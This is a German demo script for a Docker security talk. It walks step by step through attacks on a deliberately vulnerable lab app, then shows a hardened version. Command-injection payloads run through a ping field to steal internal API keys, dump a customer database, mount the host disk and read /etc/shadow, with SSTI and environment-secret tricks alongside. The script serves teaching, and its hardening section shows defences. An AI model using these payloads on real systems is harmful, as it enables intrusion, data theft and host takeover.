# Demo-Drehbuch: Docker Container Security

---

## Übersicht

| Schritt | Angriff | Zeit | Typ |
|---|---|---|---|
| 0 | Setup & Vorbereitung | ~2 Min | — |
| 1 | Command Injection | ~2 Min | **PFLICHT** |
| 2 | Lateral Movement | ~2 Min | **PFLICHT** |
| 3 | Container Escape | ~2 Min | **PFLICHT** |
| 4 | SSTI | ~2 Min | optional |
| 5 | Secrets in Env-Vars | ~1 Min | optional |
| — | Härtung zeigen | ~2 Min | **PFLICHT** |

**Pflicht-Demo:** ca. 8 Minuten  
**Mit beiden Optionals:** ca. 11 Minuten

---

## Schritt 0 — Setup (vor dem Start, nicht live)

### Im Terminal ausführen

```bash
cd docker-container-security
docker compose up -d --build
```

### Warten bis MySQL bereit ist

```bash
docker compose logs db --follow
```

Warten bis diese Zeile erscheint, dann `Ctrl+C`:

```
db  | /usr/sbin/mysqld: ready for connections
```

Alternativ einfach 60 Sekunden warten.

### Prüfen ob alles läuft

```bash
docker compose ps
```

Erwartete Ausgabe — alle drei Container müssen `running` zeigen:

```
NAME      STATUS
webapp    running
db        running
admin     running
```

### Browser-Tab öffnen

```
http://localhost:5001
```

Die Seite muss laden und ein Formular mit einem Ping-Feld zeigen.  
Blaues Design = verwundbare Version. ✓

### Terminal für die Demo bereithalten

Ein Terminal-Fenster offen lassen — wird für Schritt 3 und optional Schritt 5 gebraucht.

---

## PFLICHT — Angriff 1: Command Injection

**Was wird gezeigt:** Nutzereingabe wird ungefiltert als Shell-Befehl ausgeführt.

### 1.1 — Normaler Ping (zeigen dass das Tool "legitim" ist)

Im Browser im Ping-Feld eingeben:

```
8.8.8.8
```

Auf **„Ping ausführen"** klicken.

Erwartete Ausgabe:
```
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: ...
```

> 💬 *„Das ist ein normales Diagnose-Tool im Kundenportal — sieht harmlos aus."*

---

### 1.2 — Command Injection: Wer bin ich?

Im Ping-Feld eingeben:

```
8.8.8.8; whoami
```

Erwartete Ausgabe (ganz unten im Ergebnis):
```
root
```

> 💬 *„Das Semikolon beendet den Ping-Befehl und startet einen neuen. Die App übergibt die Eingabe ungefiltert an die Shell — wir führen jetzt beliebige Befehle als Root aus."*

---

### 1.3 — Sind wir im Container?

Im Ping-Feld eingeben:

```
8.8.8.8; cat /proc/1/cgroup
```

Erwartete Ausgabe enthält:
```
docker
```

> 💬 *„Wir sehen, dass wir in einem Docker-Container sind. Jetzt schauen wir was wir von hier aus noch erreichen können."*

---

## PFLICHT — Angriff 2: Lateral Movement

**Was wird gezeigt:** Ein kompromittierter Container kann andere interne Dienste direkt ansprechen, weil keine Netzwerksegmentierung existiert.

### 2.1 — Internen Admin-Service angreifen

Im Ping-Feld eingeben:

```
; curl -s http://admin:8080/api/config
```

Erwartete Ausgabe:
```json
{
  "admin_users": [...],
  "internal_api_keys": {
    "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
    "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "database_master_password": "SuperSecret123!"
  }
}
```

> 💬 *„Der Admin-Service ist nur im internen Netz — kein Browser weltweit kann ihn direkt aufrufen. Aber weil die Webapp im selben Netz hängt, können wir ihn über Docker-DNS ansprechen und alle API-Keys stehlen."*

---

### 2.2 — Datenbank direkt abfragen

Im Ping-Feld eingeben:

```
; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
```

Erwartete Ausgabe:
```
id  vorname  nachname  email                        kreditkarte           kontostand
1   Anna     Müller    anna.mueller@example.com     4111-XXXX-XXXX-1234   15420.50
2   Thomas   Schmidt   thomas.schmidt@example.com   5500-XXXX-XXXX-5678   8930.00
...
```

> 💬 *„Das Datenbankpasswort ist 'root' — und die Webapp hat direkten Netzwerkzugriff auf die DB. Kundendaten, Kreditkarteninformationen — alles in einer Anfrage."*

---

## PFLICHT — Angriff 3: Container Escape

**Was wird gezeigt:** Ein Container mit `privileged: true` kann das Host-Dateisystem einhängen und hat damit vollen Zugriff auf den Host.

> ⚠️ **Hinweis für Docker Desktop (macOS/Windows):** Das Einhängen funktioniert, zeigt aber das Dateisystem der internen Linux-VM, nicht den Mac/Windows-Rechner. Das Prinzip ist identisch — kurz erklären, nicht als Fehler behandeln.

---

### 3.1 — Privilegierten Modus erkennen

Im Ping-Feld eingeben:

```
; fdisk -l 2>/dev/null | head -10
```

Erwartete Ausgabe (Festplatten sind sichtbar):
```
Disk /dev/sda: 59.6 GiB, ...
Disk /dev/sdb: ...
```

> 💬 *„Ein normaler Container sieht keine Festplatten des Hosts. Weil dieser Container mit privileged: true läuft, sehen wir hier die echten Block-Devices des Hosts."*

---

### 3.2 — Richtigen Device-Namen finden

Im Ping-Feld eingeben:

```
; lsblk
```

Erwartete Ausgabe — den Namen der **ersten Partition** notieren (z.B. `sda1`, `vda1`):

```
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0 59.6G  0 disk
└─sda1   8:1    0 59.6G  0 part /
```

---

### 3.3 — Host-Dateisystem einhängen

Im Ping-Feld eingeben — `sda1` durch den Device-Namen aus 3.2 ersetzen:

```
; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
```

Erwartete Ausgabe (Root-Verzeichnis des Hosts):
```
bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  srv  sys  tmp  usr  var
```

---

### 3.4 — Host-Dateien lesen

Im Ping-Feld eingeben:

```
; cat /mnt/host/etc/hostname
```

```
; cat /mnt/host/etc/shadow | head -3
```

> 💬 *„Wir lesen jetzt Dateien vom Host-System — direkt aus dem Container heraus. Shadow-Datei mit Passwort-Hashes, Konfigurationen, SSH-Keys — alles erreichbar. Der Container ist ausgebrochen."*

---

---

## OPTIONAL — Angriff 4: Server-Side Template Injection (SSTI)

**Was wird gezeigt:** Nutzereingabe wird direkt als Jinja2-Template gerendert — Template-Ausdrücke werden serverseitig ausgewertet.

### 4.1 — Normaler Berichts-Aufruf

Im Browser aufrufen:

```
http://localhost:5001/report?title=Wochenbericht
```

Erwartete Ausgabe: Eine Seite mit der Überschrift „Wochenbericht".

---

### 4.2 — Template-Expression einschleusen

Im Browser aufrufen:

```
http://localhost:5001/report?title={{7*7}}
```

Erwartete Ausgabe: Die Überschrift zeigt **`49`** — nicht den eingegebenen Text.

> 💬 *„Jinja2 hat den Ausdruck serverseitig ausgewertet. Das bedeutet: wir kontrollieren den Template-Engine des Servers."*

---

### 4.3 — Flask-Konfiguration auslesen

Im Browser aufrufen:

```
http://localhost:5001/report?title={{config}}
```

Erwartete Ausgabe: Die gesamte Flask-Konfiguration wird angezeigt, inklusive `SECRET_KEY`.

> 💬 *„Mit dem Secret-Key können alle Session-Cookies der Anwendung gefälscht werden — jeder Nutzer kann imitiert werden. SSTI kann bis zu vollständiger Remote Code Execution eskalieren."*

---

## OPTIONAL — Angriff 5: Secrets in Umgebungsvariablen

**Was wird gezeigt:** Passwörter und API-Keys in Env-Vars sind für jeden Prozess im Container lesbar.

### Im Ping-Feld eingeben:

```
; cat /proc/1/environ | tr '\0' '\n'
```

Erwartete Ausgabe enthält:
```
DB_PASSWORD=root
SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
JWT_SECRET=my-super-secret-jwt-signing-key-2024
```

> 💬 *„Alle Umgebungsvariablen des Prozesses liegen in /proc im Klartext. Das ist die häufigste Art wie Secrets in Docker-Umgebungen übergeben werden — und einer der häufigsten Fehler in der Praxis."*

---

---

## PFLICHT — Härtung zeigen

**Was wird gezeigt:** Dieselben Angriffe schlagen in der gehärteten Version fehl.

### Im Terminal: Umschalten auf die gehärtete Version

```bash
docker compose down
docker compose -f docker-compose.hardened.yml up -d --build
```

Warten bis alles läuft (ca. 15 Sekunden):

```bash
docker compose -f docker-compose.hardened.yml ps
```

Browser neu laden:

```
http://localhost:5001
```

Grünes Design mit Badge „GEHÄRTET" = korrekt. ✓

---

### H.1 — Command Injection schlägt fehl

Im Ping-Feld eingeben:

```
8.8.8.8; whoami
```

Erwartete Ausgabe:
```
Ungültige Eingabe! Nur IP-Adressen und Hostnamen erlaubt.
```

> 💬 *„Input-Validierung mit Regex-Whitelist blockiert alles außer gültigen IPs und Hostnamen."*

---

### H.2 — Rechte im Container prüfen

Im Terminal:

```bash
docker compose -f docker-compose.hardened.yml exec webapp sh
```

Dann im Container:

```bash
whoami
```
```
appuser
```

```bash
fdisk -l
```
```
fdisk: cannot open /dev/sda: Permission denied
```

```bash
curl http://admin:8080
```
```
curl: (6) Could not resolve host: admin
```

Mit `exit` verlassen.

> 💬 *„Non-Root-User, keine Capabilities, keine Netzwerkverbindung zum Backend — selbst wenn ein Angreifer reinkäme, wäre der Schaden minimal."*

---

### Im Terminal aufräumen

```bash
docker compose -f docker-compose.hardened.yml down
```

---

## Troubleshooting

| Problem | Lösung |
|---|---|
| Browser zeigt nichts | `docker compose ps` prüfen — alle Container `running`? |
| MySQL antwortet nicht | Nochmal 30 Sek warten, dann `; mysql ...` erneut |
| `fdisk -l` zeigt nichts | Unter Docker Desktop normal — `lsblk` versuchen |
| Device-Name unbekannt | `; lsblk` ausführen und den richtigen Namen ablesen |
| SSTI zeigt `{{7*7}}` als Text | URL direkt in Adressleiste eingeben, nicht über Formular |
| Port 5001 nicht erreichbar | `docker compose ps` — läuft webapp? Sonst `docker compose logs webapp` |
| Gehärtete Version startet nicht | `docker compose down` sicherstellen, dann erneut `up` |
